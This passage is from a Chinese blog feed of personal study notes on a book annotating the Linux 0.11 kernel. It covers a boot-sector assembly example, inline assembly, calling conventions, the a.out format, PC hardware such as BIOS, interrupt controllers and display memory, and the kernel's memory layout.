的框架程序.用代码0x07替换字符串msg1中一个字符,然后在屏幕上1行显示</span><br><span class="line">!</span><br><span class="line">.globl begtext, begdata, begbss, endtext, enddata, endbss !全局标识符,供ld86链接使用</span><br><span class="line">.text  !代码段</span><br><span class="line">begtext:</span><br><span class="line">.data</span><br><span class="line">begdata:</span><br><span class="line">.bss</span><br><span class="line">begbss:</span><br><span class="line">.text</span><br><span class="line">BOOTSEG = 0x07c0   !类似于C语言宏定义,EQU,Intel内存代码执行首地址</span><br><span class="line">entry start        !告知链接程序,程序从start标号开始执行</span><br><span class="line">start:</span><br><span class="line">jmpi	go, BOOTSEG !段间跳转,两个地址,低地址16位送IP寄存器,高地址16位送cs段寄存器</span><br><span class="line">go:</span><br><span class="line">		mov	ax, cs  !将cs段寄存器值同步至ds,es,此代码未用到ss</span><br><span class="line">		mov es, ax</span><br><span class="line">		mov ds, ax</span><br><span class="line">		mov [msg1+17], ah   !示例修改串,然后会调用BIOS中断,参考链接https://zh.wikipedia.org/wiki/INT_10</span><br><span class="line">		mov	cx, #20  		!立即数需要前缀#,根据BIOS提供的接口约定,cx为字符总个数</span><br><span class="line">		mov	dx, #0x1004  	!约定,位置,此时为17行5列</span><br><span class="line">		mov bx, #0x000c    	!约定,字符属性(红色)</span><br><span class="line">		mov bp, #msg1		!约定,字符缓冲区首地址</span><br><span class="line">		mov ax, #0x1301		!ah=0x13表示写字符串功能号</span><br><span class="line">		int 0x10			!调用BIOS中断</span><br><span class="line">loop1:  jmp 	loop1  		!死循环待机</span><br><span class="line">msg1:	.ascii	&quot;Loading system...&quot; !字符20个,包括回车换行</span><br><span class="line">		.byte 	13,10</span><br><span class="line">.org	510					!表示以后的语句从偏移地址510开始放</span><br><span class="line">		.word 	0xAA50		!有效引导扇区标志,约定</span><br><span class="line">.text</span><br><span class="line">endtext:</span><br><span class="line">.data</span><br><span class="line">enddata:</span><br><span class="line">.bss</span><br><span class="line">endbss:</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>可参照如下命令进行编译链接等<br><img src="/images/Linux_0.11_chapter3_as86_compile.png" alt="Linux_0.11_chapter3_as86_compile.png"></p>
</li>
<li><p>本应该512字节的boot程序(MBR)多出32字节为MINIX可执行文件头结构,需剔除掉(dd命令等).而后可用Bochs等模拟器观察现象,正常如下:<br><img src="/images/Linux_0.11_chapter3_as86_boot.png.png" alt="Linux_0.11_chapter3_as86_boot.png.png"></p>
</li>
<li><p><strong>as86具体使用方法:</strong><br><img src="/images/Linux_0.11_chapter3_as86.png" alt="Linux_0.11_chapter3_as86.png"></p>
</li>
<li><p><strong>ld86具体使用方法:</strong><br><img src="/images/Linux_0.11_chapter3_ld86.png" alt="Linux_0.11_chapter3_ld86.png"></p>
</li>
</ul>
<h1 id="GNU-as汇编"><a href="#GNU-as汇编" class="headerlink" title="GNU as汇编"></a>GNU as汇编</h1><ul>
<li>内核中其余所有汇编语言程序(包括C语言产生的汇编程序)均由gas来编译,并与C语言程序编译产生的模块进行链接. </li>
<li><strong>Intel格式的汇编与AT&amp;T格式的汇编区别:</strong><br><img src="/images/Linux_0.11_chapter3_Intel_AT&T_diff.png" alt="Linux_0.11_chapter3_Intel_AT&amp;T_diff.png"></li>
<li>as汇编器对汇编语言程序只进行简单地预处理,比如调整并删除多余空格和制表符,删除注释等;如需要进行宏替换则可以让汇编语言程序使用大写后缀’.S’来让as使用gcc的CPP预处理功能.</li>
<li>具体关于汇编指令部分可以参考Intel开发者手册<h2 id="区和重定位"><a href="#区和重定位" class="headerlink" title="区和重定位"></a>区和重定位</h2></li>
<li>区:有时候也成为段,节或部分,英文为section,用来表示一个地址范围,操作系统将会以相同的方式对待和处理改地址范围的数据信息.</li>
<li>重定位:当汇编过后的数据中出现重定位节时候,由链接器负责修正重定位的数据部分(至于为什么会需要重定位这与很多机制有关系了,必须虚拟内存等).<h2 id="链接器涉及的区"><a href="#链接器涉及的区" class="headerlink" title="链接器涉及的区:"></a>链接器涉及的区:</h2><img src="/images/Linux_0.11_chapter3_linker_section.png" alt="Linux_0.11_chapter3_linker_section.png"></li>
<li>关于gcc对于C程序的编译和链接过程可参考<a href="http://www.rutk1t0r.org/2016/09/06/C%E8%AF%AD%E8%A8%80%E5%AE%8F%E5%AE%9A%E4%B9%89%E5%B0%8F%E8%AF%95/">前文</a><h2 id="嵌入汇编"><a href="#嵌入汇编" class="headerlink" title="嵌入汇编"></a>嵌入汇编</h2></li>
<li>格式： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asm(&quot;汇编语句&quot;</span><br><span class="line">	:输出寄存器</span><br><span class="line">	:输入寄存器</span><br><span class="line">	:会被修改的寄存器);</span><br></pre></td></tr></table></figure></li>
<li>嵌入汇编的好处就是利用gcc的灵活性在C语言里面精练地实现某些特定功能</li>
<li>Linux内核源码中仍然在使用圆括号的组合语句，一般用在宏定义。</li>
<li>strcpy的嵌入汇编实现如下，因为首先要进行预处理，所以增加换行便于浏览。 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//将字符串(src)拷贝到另一字符串(dest)，直到遇到NULL字符后终止</span></span><br><span class="line"><span class="comment">//参数:dest - 目的字符串指针, src - 源字符串指针, %0 - esi(src), %1 - edi(dest)。</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">inline</span> <span class="keyword">char</span> *<span class="title">strcpy</span><span class="params">(<span class="keyword">char</span> *dest, <span class="keyword">const</span> <span class="keyword">char</span> *src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__asm__(<span class="string">&quot;cld\n&quot;</span>			<span class="comment">//清空方向标志，往上为默认增长</span></span><br><span class="line">		<span class="string">&quot;1:\tlodsb\n\t&quot;</span> <span class="comment">//加载DS:[esi]处1字节-&gt;al,esi++</span></span><br><span class="line">		<span class="string">&quot;stosb\n\t&quot;</span>		<span class="comment">//存储al-&gt;ES:[edi],edi++</span></span><br><span class="line">		<span class="string">&quot;testb %%al, %%al\n\t&quot;</span>	<span class="comment">//测试刚刚存储是否为NULL字符</span></span><br><span class="line">		<span class="string">&quot;jne 1b&quot;</span>		<span class="comment">//不是则继续跳到标号1处，否则就结束</span></span><br><span class="line">		::<span class="string">&quot;S&quot;</span>(src), <span class="string">&quot;D&quot;</span>(dest)<span class="string">&quot;:&quot;</span>si<span class="string">&quot;,&quot;</span>di<span class="string">&quot;,&quot;</span>ax<span class="string">&quot;);</span></span><br><span class="line"><span class="string">return dest;			//返回目的字符串首地址，实现链式</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure></li>
<li>嵌入汇编加载代码<br><img src="/images/Linux_0.11_chapter3_emb_asm_load_code1.png" alt="Linux_0.11_chapter3_emb_asm_load_code1.png"><br><img src="/images/Linux_0.11_chapter3_emb_asm_load_code2.png" alt="Linux_0.11_chapter3_emb_asm_load_code2.png"><h2 id="C与汇编的相互调用"><a href="#C与汇编的相互调用" class="headerlink" title="C与汇编的相互调用"></a>C与汇编的相互调用</h2></li>
<li>调用约定(主要根据参数顺序、传参方式以及平衡堆栈者等来区分,当然其他体系结构也有其他实现,这里主要是IA-32体系,Intel 64调用约定已经开始大幅度使用寄存器传参)<ul>
<li>fastcall:Linux系统调用比较常用，直接利用寄存器传参，子程序(被调用者)清除栈帧</li>
<li>__cdecl:参数从右至左压栈，由调用者负责清除栈空间，可变参数</li>
<li>stdcall:Windows的Win32 API常用，与__cdecl区别是被调用者一般用类似<code>ret n</code>指令来清除栈空间(清除栈空间主要是恢复被保存的寄存器值以及栈指针回归)</li>
<li>PASCAL:从左到右压栈，被调用者清栈</li>
<li>this:C++标准的Microsoft实现利用ecx传递对象首地址</li>
</ul>
</li>
<li>在软件工程师的角度,以汇编语言作为”车轮子”和”底线”完全可以应付了绝大多数的问题了，因此只要源代码汇编过后保持一致性，各种语言之间的相互调用都是可以的。</li>
</ul>
<h1 id="Linux-0-11目标文件格式"><a href="#Linux-0-11目标文件格式" class="headerlink" title="Linux 0.11目标文件格式"></a>Linux 0.11目标文件格式</h1><blockquote>
<p>有关目标文件和链接程序的基本工作原理可参见John R.Levine著的《Linkers &amp; Loaders》(有中文译版）一书。</p>
</blockquote>
<h2 id="a-out映像"><a href="#a-out映像" class="headerlink" title="a.out映像"></a>a.out映像</h2><ul>
<li>在Linux 0.11系统中，GNU gcc或者gas编译输出的目标模块文件和链接程序所生成的可执行文件都使用了UNIX传统的a.out格式。对于具有内存分页机制的系统(可由硬件芯片给予软件以支持）来说，这是一种简单有效的目标文件格式。<br><img src="/images/Linux_0.11_chapter3_a.out_map.png" alt="Linux_0.11_chapter3_a.out_map.png"><br><img src="/images/Linux_0.11_chapter3_a.out_map_header1.png" alt="Linux_0.11_chapter3_a.out_map_header1.png"><br><img src="/images/Linux_0.11_chapter3_a.out_map_header2.png" alt="Linux_0.11_chapter3_a.out_map_header2.png"></li>
<li>Linux内核可执行文件加载器将可执行文件从磁盘加载到内存中的映像<br><img src="/images/Linux_0.11_chapter3_a.out_map_to_memory.png" alt="Linux_0.11_chapter3_a.out_map_to_memory.png"></li>
<li>链接程序的操作<br><img src="/images/Linux_0.11_chapter3_a.out_linkers.png" alt="Linux_0.11_chapter3_a.out_linkers.png"></li>
</ul>
<h2 id="链接程序预定义变量"><a href="#链接程序预定义变量" class="headerlink" title="链接程序预定义变量"></a>链接程序预定义变量</h2><ul>
<li><p>在链接过程中，链接器ld和ld86会使用自身的变量记录下执行程序中每个段的逻辑地址。因此可以在程序用通过几个外部变量来获取程序中段的位置。</p>
</li>
<li><p>_etext(etext):它的地址是.text段结束后的第一个地址;</p>
</li>
<li><p>_edata(edata):它的地址是.data初始化数据区后的第一个地址;</p>
</li>
<li><p>_end(end):它的地址是未初始化数据区.bss后的第一个地址位置。</p>
</li>
<li><p>带下划线前缀和不带是等价的，唯一的区别在ANSI、POSIX等标准中没有定义符号etext、edata和end。</p>
</li>
<li><p>Linux 0.1x 内核在初始化块设备高速缓存区时(fs/buffer.c)， 就使用了变量_end来获取内核映像文件Image在内存中的末端后的位置，并从这个位置起开始设置高速缓冲区。</p>
</li>
<li><p>利用System.map文件可以找寻到<strong>目标文件及符号信息映射到内存的位置</strong>、<strong>公共符号设置</strong>、<strong>链接中包含的所有文件成员以及其引用的符号</strong>和<strong>内核运行错误信息及调试</strong>。</p>
</li>
<li><p>目标文件符号列表文件中的符号类型<br><img src="/images/Linux_0.11_chapter3_a.out_symbol1.png" alt="Linux_0.11_chapter3_a.out_symbol1.png"><br><img src="/images/Linux_0.11_chapter3_a.out_symbol2.png" alt="Linux_0.11_chapter3_a.out_symbol2.png"></p>
</li>
</ul>
<h1 id="Make-和-Makefile"><a href="#Make-和-Makefile" class="headerlink" title="Make 和 Makefile"></a>Make 和 Makefile</h1><ul>
<li>make程序通过Makefile文件知道如何编译和链接程序</li>
<li>make的执行过程为两个阶段。</li>
<li>读取<strong>所有的</strong>Makefile文件以及包含的Makefile文件等，记录所有的变量及值、隐式的或显式的规则，并构造出所有目标对象及其先决条件的一幅全景图;</li>
<li>make就使用这些内部结构来确定哪个目标对象需要被重建，并且根据相应的规则来操作。</li>
<li>当make重新编译程序的时，每个修改过的C代码文件(根据文件时间戳)必须被重新编译。如果头文件被修改过了，那么为了保证正确，make也会重新编译每个包含此头文件的C代码文件。</li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
<li>基本的开发环境需要搭建和理解</li>
<li>汇编语言在Linux内核中的重要性</li>
<li>目标文件格式基本格式需理解(PE更复杂)</li>
<li>链接器的高级特效需理解</li>
<li>Makefile高级用法需要会用</li>
</ul>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
        <tag>Linux kernel</tag>
        <tag>LDD</tag>
        <tag>Asm</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux内核0.11完全注释 第二章</title>
    <url>/embpgp.github.io/2016/11/07/Linux%E5%86%85%E6%A0%B80-11%E5%AE%8C%E5%85%A8%E6%B3%A8%E9%87%8A-%E7%AC%AC%E4%BA%8C%E7%AB%A0/</url>
    <content><![CDATA[<blockquote>
<p>微型计算机组成结构</p>
</blockquote>
<span id="more"></span>

<hr>
<h1 id="传统IBM-PC及其兼容计算机的组成框图"><a href="#传统IBM-PC及其兼容计算机的组成框图" class="headerlink" title="传统IBM PC及其兼容计算机的组成框图"></a>传统IBM PC及其兼容计算机的组成框图</h1><p>可以看出唯有地址总线是单向的,从CPU发出,指向各种控制器和接口.而数据总线和控制总线需要是双向的是由于数据需要读写和控制信号的发出和捕获.<br><img src="/images/Linux_0.11_arch_IBM_Intel.png" alt="Linux_0.11_arch_IBM_Intel"></p>
<h1 id="现代PC机芯片集框图"><a href="#现代PC机芯片集框图" class="headerlink" title="现代PC机芯片集框图"></a>现代PC机芯片集框图</h1><p><img src="/images/Linux_0.11_modern_PC.png" alt="Linux_0.11_modern_PC.png"></p>
<h1 id="I-O端口寻址和访问控制方式"><a href="#I-O端口寻址和访问控制方式" class="headerlink" title="I/O端口寻址和访问控制方式"></a>I/O端口寻址和访问控制方式</h1><h2 id="端口编址"><a href="#端口编址" class="headerlink" title="端口编址"></a>端口编址</h2><p>1 统一编址:把I/O控制器的端口地址归入存储器寻址地址空间范围内.CPU访问一个端口的操作与访问内存的操作一样,不需要特别的指令.硬件工程师或芯片工程师需确定采用何种编址.<br>2 独立编址:把I/O控制器和控制卡的寻址空间单独作为一个独立的地址空间对待,称为I/O地址空间.必须使用特殊指令来操作,例如Intel中的IN和OUT指令.此时引脚接线也不一样.  </p>
<p>IBM PC采用了两种方案,独立编址部分采用ISA总线结构分配I/O空间为0x000-0x3ff共1024个端口.统一编址部分例如CGA显卡占据存储器空间0xB8000-0xBC000范围,即CPU地址总线发出此范围的地址并向数据总线上按约定写入ascii值及属性即可显示字符了.  </p>
<h3 id="查看I-O地址范围"><a href="#查看I-O地址范围" class="headerlink" title="查看I/O地址范围"></a>查看I/O地址范围</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rutk1t0r@Rutk1t0r:~$ cat /proc/ioports </span><br><span class="line">0000-0cf7 : PCI Bus 0000:00</span><br><span class="line">  0000-001f : dma1</span><br><span class="line">  0020-0021 : pic1</span><br><span class="line">  0040-0043 : timer0</span><br><span class="line">  0050-0053 : timer1</span><br><span class="line">  0060-0060 : keyboard</span><br><span class="line">  0062-0062 : PNP0C09:00</span><br><span class="line">    0062-0062 : EC data</span><br><span class="line">  0064-0064 : keyboard</span><br><span class="line">  0066-0066 : PNP0C09:00</span><br><span class="line">    0066-0066 : EC cmd</span><br><span class="line">  0070-0077 : rtc0</span><br><span class="line">  0080-008f : dma page reg</span><br><span class="line">  00a0-00a1 : pic2</span><br><span class="line">  00c0-00df : dma2</span><br><span class="line">  00f0-00ff : fpu</span><br><span class="line">    00f0-00f0 : PNP0C04:00</span><br><span class="line">  03c0-03df : vesafb</span><br><span class="line">  0400-0403 : ACPI PM1a_EVT_BLK</span><br><span class="line">  0404-0405 : ACPI PM1a_CNT_BLK</span><br><span class="line">  0408-040b : ACPI PM_TMR</span><br><span class="line">  0410-0415 : ACPI CPU throttle</span><br><span class="line">  0420-042f : ACPI GPE0_BLK</span><br><span class="line">  0430-0433 : iTCO_wdt.2.auto</span><br><span class="line">  0450-0450 : ACPI PM2_CNT_BLK</span><br><span class="line">  0454-0457 : pnp 00:02</span><br><span class="line">  0458-047f : pnp 00:00</span><br><span class="line">    0460-047f : iTCO_wdt.2.auto</span><br><span class="line">  0500-057f : pnp 00:00</span><br><span class="line">  0680-069f : pnp 00:00</span><br><span class="line">0cf8-0cff : PCI conf1</span><br><span class="line">0d00-ffff : PCI Bus 0000:00</span><br><span class="line">  1000-100f : pnp 00:00</span><br><span class="line">  164e-164f : pnp 00:00</span><br><span class="line">  2000-2fff : PCI Bus 0000:01</span><br><span class="line">    2000-20ff : 0000:01:00.0</span><br><span class="line">      2000-20ff : r8169</span><br><span class="line">  3000-303f : 0000:00:02.0</span><br><span class="line">  3040-305f : 0000:00:1f.3</span><br><span class="line">  3060-307f : 0000:00:1f.2</span><br><span class="line">    3060-307f : ahci</span><br><span class="line">  3080-3087 : 0000:00:1f.2</span><br><span class="line">    3080-3087 : ahci</span><br><span class="line">  3088-308f : 0000:00:1f.2</span><br><span class="line">    3088-308f : ahci</span><br><span class="line">  3090-3093 : 0000:00:1f.2</span><br><span class="line">    3090-3093 : ahci</span><br><span class="line">  3094-3097 : 0000:00:1f.2</span><br><span class="line">    3094-3097 : ahci</span><br><span class="line">  4000-4fff : PCI Bus 0000:02</span><br><span class="line">  fd60-fd63 : pnp 00:00</span><br><span class="line">  ffff-ffff : pnp 00:00</span><br><span class="line">    ffff-ffff : pnp 00:00</span><br></pre></td></tr></table></figure>
<h2 id="接口访问控制"><a href="#接口访问控制" class="headerlink" title="接口访问控制"></a>接口访问控制</h2><h3 id="轮询"><a href="#轮询" class="headerlink" title="轮询"></a>轮询</h3><p>CPU通过在程序中循环查询指定设备控制器中的状态来判断是否与设备进行数据交换.简单耗费CPU时间,适合任务等待时间极短或必须的情况.</p>
<h3 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h3><p>需要中断控制器的支持,顾名思义,当事件发生后,CPU暂停当前程序转而执行I/O中断处理服务过程,之后视情况才恢复被中断的程序.需要早就填充好中断向量表.效率较高.</p>
<h3 id="DMA"><a href="#DMA" class="headerlink" title="DMA"></a>DMA</h3><p>用于I/O设备与系统内存之间进行大批量数据传送,整个过程需要使用专门的DMA控制器来进行而CPU在传输过程中无需插手.结合中断配合效率很高的.</p>
<h1 id="存储器"><a href="#存储器" class="headerlink" title="存储器"></a>存储器</h1><h2 id="主存储器映射"><a href="#主存储器映射" class="headerlink" title="主存储器映射"></a>主存储器映射</h2><p><img src="/images/Linux_0.11_Main_Memory.png" alt="Linux_0.11_Main_Memory.png"></p>
<h2 id="BIOS"><a href="#BIOS" class="headerlink" title="BIOS"></a>BIOS</h2><p>顾名思义,基本的输入/输出系统,存放在ROM中的系统BIOS主要用于计算机开机执行系统各个部分自检,并建立起操作系统要使用的各种配置表,把处理器和系统其余部分初始化到一个已知的状态,且为DOS等系统提供硬件设备接口服务.除此之外Linux操作系统在运行的时候并不适用BIOS中的功能.当计算机系统上电开机或者按下了机箱上的复位按钮时,CPU捕获到信号后把CS寄存器设置为0xF000,段基址被设置为0xFFFF0000,段长度为64K.而EIP寄存器(32位体系)被设置为0xFFF0,因此线性地址计算得到0xFFFFFFF0,这个是写死的.4G空间最后一个64K(以前的8086分段特性)的最后16字节处,一般安排一条JMP跳转指令跳到BIOS代码中64KB范围内的某一条指令开始执行.由于目前PC/AT微机中的BIOS容量大多有1MB-2MB,并存储在FLASH中,因此为了能够执行或者访问BIOS超过64KB范围并且又远远不在0-1M地址空间中的其他BIOS代码或者数据,BIOS程序首先使用一个成为32位大模式技术把数据段寄存器的访问范围设置为4G.此后,BIOS在执行了一系列硬件检测和初始化操作之后,把与原来PC机兼容的64KB BIOS代码和数据复制到内存低端1M末端的64K处,然后跳转到这个地方并且让CPU进入真正的实地址模式工作.如下图,最后BIOS会从硬盘或者其他块启动设备把操作系统引导程序加载在内存0x7c00处(Intel约定),并跳转到这个地方继续执行引导程序.<br><img src="/images/Linux_0.11_ROM_BIOS.png" alt="Linux_0.11_ROM_BIOS.png"></p>
<h2 id="CMOS存储器"><a href="#CMOS存储器" class="headerlink" title="CMOS存储器"></a>CMOS存储器</h2><p>主要用来存放计算机实时时钟信息和系统硬件配置信息,这部分内存通常和实时时钟芯片做在一块集成块中,CMOS内存的地址空间在基本内存地址空间之外,需要用I/O指令来访问.</p>
<h1 id="控制器和控制卡"><a href="#控制器和控制卡" class="headerlink" title="控制器和控制卡"></a>控制器和控制卡</h1><h2 id="中断控制器"><a href="#中断控制器" class="headerlink" title="中断控制器"></a>中断控制器</h2><p>IBM PC/AT 80X86兼容微机采两片级联的8259A可编程中断控制芯片组成一个中断控制器,Linux在内核初始化会继续重新对8259A进行编程来使得其符合自身的控制.<br><img src="/images/Linux_0.11_interrupt_8259A.png" alt="Linux_0.11_interrupt_8259A.png"></p>
<h2 id="DMA控制器"><a href="#DMA控制器" class="headerlink" title="DMA控制器"></a>DMA控制器</h2><p>采用两块Intel 8237芯片具有8个独立通道,对页面寄存器端口,(偏移)地址寄存器端口和数据寄存器端口进行设置来启用数据传送.由于DMA寄存器是8位的,而地址和计数值是16位值,因此各自需要发送两次.</p>
<h2 id="定时-计数器"><a href="#定时-计数器" class="headerlink" title="定时/计数器"></a>定时/计数器</h2><p>采用Intel 8253/8254来产生精确的计时中断信号,动态内存DRAM刷新电路和主机扬声器音调合成.Linux 0.11对通道0进行设置,使其工作在方式3下,并且每隔10ms发出IRQ0,即内核的工作脉搏,用于定时切换任务及统计系统资源量.</p>
<h2 id="键盘控制器"><a href="#键盘控制器" class="headerlink" title="键盘控制器"></a>键盘控制器</h2><p>采用类Intel 8042芯片对键盘的接通码和断开嘛进行扫描并计算.通过IRQ1引脚向CPU发出中断请求.根据三套扫描码集确定具体键盘字符.(早期的键盘控制器P21引脚控制CPU A21信号线开启大范围寻址)</p>
<h2 id="串行控制卡"><a href="#串行控制卡" class="headerlink" title="串行控制卡"></a>串行控制卡</h2><p>PC常用符合RS-232C标准的串行接口,并使用通用异步收发器控制芯片UART组成的串行控制器来处理串行数据的手法工作.</p>
<h2 id="显示控制"><a href="#显示控制" class="headerlink" title="显示控制"></a>显示控制</h2><p>IBM最早推出的PC机视频系统标准有单色MDA标准和彩色CGA标准以及EGA和VGA标准.以后推出的所有高级显卡(包括现在的AGP显卡)虽然都具有极高的图形处理速度和智能加速处理,但是它们都支持这几种标准.Linux 0.1x操作系统仅仅使用了这几种标准都支持的文本显示方式.</p>
<h3 id="MDA显示标准"><a href="#MDA显示标准" class="headerlink" title="MDA显示标准"></a>MDA显示标准</h3><p>仅支持黑白两色,并且只支持独有的文本字符显示方式(BIOS显示方式7).屏幕规格80*25(列号x=0..79;行号y=0..24),共可以显示2000字符(难怪在Linux中打开shell默认都是80*25).每个字符还带有1个属性字节,因此显示一屏(一帧)内容需要占据4KB字节.其中偶地址字节存放字符代码(ascii),奇地址存放显示属性.MDA卡配置有8KB显存.在PC机内存寻址范围中占用0xb0000开始的8K空间(0xb0000-0xb2000).如果显示屏行数是video_num_lines=25;列数是video_num_colums=80,那么位于屏幕列行值x,y处的字符和属性在内存中的位置是:<br>字符字节位置 = 0xb0000 + video_num_colums*2*y + x*2;<br>属性字节位置 = 字符字节位置+1;</p>
<blockquote>
<p><strong>注意此处坐标系为从屏幕左上角开始往右为x增大,往下为y增大,均不为负值.</strong>  </p>
</blockquote>
<p><img src="/images/Linux_0.11_MDA_Color.png" alt="Linux_0.11_MDA_Color.png"></p>
<h3 id="CGA显示标准"><a href="#CGA显示标准" class="headerlink" title="CGA显示标准"></a>CGA显示标准</h3><p>CGA支持7种彩色和图形显示方式(BIOS显示方式0-6).在80列*25行的文本字符显示方式下,有单色和16色彩色两种显示方式(BIOS显示方式2-3).CGA卡标配有16K显示内存(占用内存地址范围0xb8000-0xbc000),因此可存放4帧信息,同样,在每一帧4K显存中,偶数地址存字符代码,奇数字节存放显示属性.但是在console.c程序中只使用了其中8K显存(0xb8000-0xba000).字符显示属性定义如下:<br><img src="/images/Linux_0.11_CGA_Color.png" alt="Linux_0.11_CGA_Color.png"></p>
<h3 id="EGA-VGA显示标准"><a href="#EGA-VGA显示标准" class="headerlink" title="EGA/VGA显示标准"></a>EGA/VGA显示标准</h3><p><img src="/images/Linux_0.11_EGA_VGA.png" alt="Linux_0.11_EGA_VGA.png"></p>
<h2 id="软盘和硬盘控制器"><a href="#软盘和硬盘控制器" class="headerlink" title="软盘和硬盘控制器"></a>软盘和硬盘控制器</h2><p>由于软盘片比较容易遭到损坏(发霉或划伤),因此目前计算机中已经逐渐开始不配置软盘驱动器,取而代之的是用U盘.而硬盘作为相对于比较大容量和每比特信息廉价的外存设备,在PC中仍然大量存在.下面是硬盘的一些工作原理:<br><img src="/images/Linux_0.11_hard_disk1.png" alt="Linux_0.11_hard_disk1.png"><br><img src="/images/Linux_0.11_hard_disk2.png" alt="Linux_0.11_hard_disk2.png"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本章介绍了基于Intel 80X86芯片组的计算机组成结构及各个工作部件的工作原理.便于理解操作系统内核的实现,毕竟软件要根据硬件的框架在铺设的.</p>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
        <tag>Linux kernel</tag>
        <tag>LDD</tag>
        <tag>Asm</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux内核0.11完全注释 第五章</title>
    <url>/embpgp.github.io/2016/12/14/Linux%E5%86%85%E6%A0%B80-11%E5%AE%8C%E5%85%A8%E6%B3%A8%E9%87%8A-%E7%AC%AC%E4%BA%94%E7%AB%A0/</url>
    <content><![CDATA[<blockquote>
<p>久违的章节,简介Linux内核体系结构</p>
</blockquote>
<span id="more"></span>

<hr>
<h1 id="OS组成部分"><a href="#OS组成部分" class="headerlink" title="OS组成部分"></a>OS组成部分</h1><p><img src="/images/Linux_0.11_chapter5_Linux_kernel_arch.png" alt="Linux_0.11_chapter5_Linux_kernel_arch.png"></p>
<blockquote>
<p>所谓内核，主要是运行起来之后与计算机硬件交互，实现对硬件部件的编程控制和接口操作，调度对硬件资源的访问，并且为计算机的用户程序提供一个高级环境和对硬件的虚拟接口。个人认为纯粹地看就是一大堆的数据结构和策略算法以及驱动程序，当然为了能够发挥作用必须得提供接口给用户等等。</p>
</blockquote>
<h1 id="宏内核模型"><a href="#宏内核模型" class="headerlink" title="宏内核模型"></a>宏内核模型</h1><p><img src="/images/Linux_0.11_chapter5_Linux_kernel_single_model.png" alt="Linux_0.11_chapter5_Linux_kernel_single_model.png"></p>
<ul>
<li>灵活运用计算机体系里最重要的”分层”思想，可以很好地解决大问题，此时可以揣摩计算机网络等等</li>
<li>服务提供者和调用者即“客户-服务”思想让人容易想到C++类等等机制</li>
</ul>
<h1 id="Linux内核体系结构"><a href="#Linux内核体系结构" class="headerlink" title="Linux内核体系结构"></a>Linux内核体系结构</h1><h2 id="主要模块"><a href="#主要模块" class="headerlink" title="主要模块"></a>主要模块</h2><ul>
<li>进程调度</li>
<li>内存管理</li>
<li>文件系统</li>
<li>进程间通信</li>
<li>网络接口<br><img src="/images/Linux_0.11_chapter5_Linux_kernel_arch_picture.png" alt="Linux_0.11_chapter5_Linux_kernel_arch_picture.png"></li>
</ul>
<h1 id="内核对内存的管理和使用"><a href="#内核对内存的管理和使用" class="headerlink" title="内核对内存的管理和使用"></a>内核对内存的管理和使用</h1><h2 id="内存分布视图"><a href="#内存分布视图" class="headerlink" title="内存分布视图"></a>内存分布视图</h2><p><img src="/images/Linux_0.11_chapter5_Linux_kernel_mm_function.png" alt="Linux_0.11_chapter5_Linux_kernel_mm_function.png"></p>
<ul>
<li>其中显存和ROM BIOS部分是由于工程师在集成PC的时候把地址空间分给了它们。</li>
<li>分段机制在Intel处理器中必须开启，但是软件工程师可以采用”平坦模式”寻址使得没有分段</li>
<li>分页机制需要大量的”铺垫”才能启用，并且为mm子系统提供支持<h2 id="内存地址空间概念"><a href="#内存地址空间概念" class="headerlink" title="内存地址空间概念"></a>内存地址空间概念</h2></li>
<li>虚拟地址:由程序运行时候CPU内部的段选择子和段内偏移组成，因为没有直接用来访问物理内存(区别于8086时代)，因此成为虚拟地址。虚拟地址空间由GDT和LDT映射组成，理论上的空间总量(注意不要又扯到物理地址去了，不要管地址总线多少根)为2^13*4G=64T。逻辑地址即可理解为虚拟地址。</li>
<li>线性地址:虚拟地址和物理地址变换之间的中间层，是处理器可以寻址的内存空间。即相应的段基址加上偏移地址即可，相当于去描述符表中或者高速缓存中取了一次数据后合并后的地址。如果此时没有启用分页机制，则线性地址即为物理地址，CPU直接放在地址总线上去内存中存取数据。</li>
<li>物理地址:即CPU外部总线上的地址信号，如果开启分页机制，则线性地址必须经过CR3、页目录和页表等转换才能送到地址总线上。</li>
<li>虚拟存储:即OS使得CPU对所有内存的寻址加一个”hook”,以满足最大化的需求。</li>
</ul>
<p><img src="/images/Linux_0.11_chapter5_Linux_kernel_vm_space.png" alt="Linux_0.11_chapter5_Linux_kernel_vm_space.png"></p>
<h2 id="Linux具体的内存分布"><a href="#Linux具体的内存分布" class="headerlink" title="Linux具体的内存分布"></a>Linux具体的内存分布</h2><p><img src="/images/Linux_0.11_chapter5_Linux_kernel_line_addr.png" alt="Linux_0.11_chapter5_Linux_kernel_line_addr.png"></p>
<ul>
<li>虽然代码段和数据段共用一个内存空间，但是对于当时的版本来说安全性不是首要考虑的，因此一切以方便工程师编程为出发点。</li>
<li>各种人工的定义也是为了方便操作。<br><img src="/images/Linux_0.11_chapter5_Linux_kernel_process_code_data_space.png" alt="Linux_0.11_chapter5_Linux_kernel_process_code_data_space.png"></li>
</ul>
<h2 id="内核代码段和数据段三种地址转换"><a href="#内核代码段和数据段三种地址转换" class="headerlink" title="内核代码段和数据段三种地址转换"></a>内核代码段和数据段三种地址转换</h2><p><img src="/images/Linux_0.11_chapter5_Linux_kernel_code_data_on_3_addr_convert.png" alt="Linux_0.11_chapter5_Linux_kernel_code_data_on_3_addr_convert.png"></p>
<ul>
<li>在head.s程序的初始化过程中把内核代码段和数据段都设置为16M的段，两个段重叠并且线性地址都为0开始到0xFFFFF。</li>
<li>在这16M的内核空间中包括所有的代码、内核段表、页目录表和内核的二级页表、内核局部数据以及内核临时堆栈(将被用作任务0的用户堆栈)。</li>
